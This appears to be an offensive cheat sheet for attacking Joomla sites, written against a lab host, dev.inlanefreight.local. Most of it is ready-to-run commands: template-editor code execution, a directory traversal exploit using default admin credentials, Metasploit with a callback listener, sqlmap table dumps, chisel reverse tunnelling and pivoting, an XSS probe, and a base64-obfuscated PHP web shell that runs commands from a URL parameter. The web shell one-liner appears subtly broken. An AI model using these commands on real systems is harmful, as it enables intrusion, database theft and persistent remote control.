# Attacking Joomla

## 1. Admin Panel Code Execution (Template Customization)

```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

* Log in to `/administrator` with admin credentials.
* Modify template files to inject PHP code for RCE.
* Use non-standard parameters and clean up web shells.

## 2. Core Directory Traversal (CVE-2019-10945)

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

* Exploits directory traversal and file deletion.
* Useful if admin panel is inaccessible from outside.
* Can reveal sensitive files like `configuration.php`.

## 3. Configuration File Exploitation

```bash
curl -s http://dev.inlanefreight.local/configuration.php
```

## 4. Extension Exploitation

```bash
curl -s http://dev.inlanefreight.local/components/[vulnerable_component]/[exploit_path]?param=[malicious_payload]
```

## 5. Metasploit Joomla Modules

```bash
msf6 > search joomla
msf6 > use exploit/unix/webapp/joomla_...
msf6 > set RHOSTS dev.inlanefreight.local
msf6 > set RPORT 80
msf6 > set TARGETURI /administrator/
msf6 > set USERNAME admin
msf6 > set PASSWORD admin
msf6 > set LHOST [your_ip]
msf6 > set LPORT 4444
msf6 > exploit
```

## 6. Database Exploitation

```bash
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" --dbs --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] --tables --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] -T [table_name] --columns --batch
sqlmap -u "http://dev.inlanefreight.local/index.php?id=1" -D [database_name] -T [table_name] -C [column1,column2] --dump --batch
```

## 7. Post-Exploitation

```bash
linpeas.sh
winpeas.exe
chisel server -p 1080 --reverse & chisel client [target_ip]:1080 R:socks
sshuttle -r user@target_ip 0.0.0.0/0
```

## 8. REST API Attacks

```bash
curl -s http://dev.inlanefreight.local/api/index.php/v1/users
```

## 9. Advanced Web Shell Techniques

```bash
php -r '$s="c3lzdGVtKCRfR0VUWyJjbWQiXSk7";eval(base64_decode($s));' > shell.php
```

## 10. Client-Side Attacks (XSS)

```bash
curl "http://dev.inlanefreight.local/index.php?param=<script>alert(1)</script>"
```

## 11. Joomla CLI

```bash
joomla user:list
```
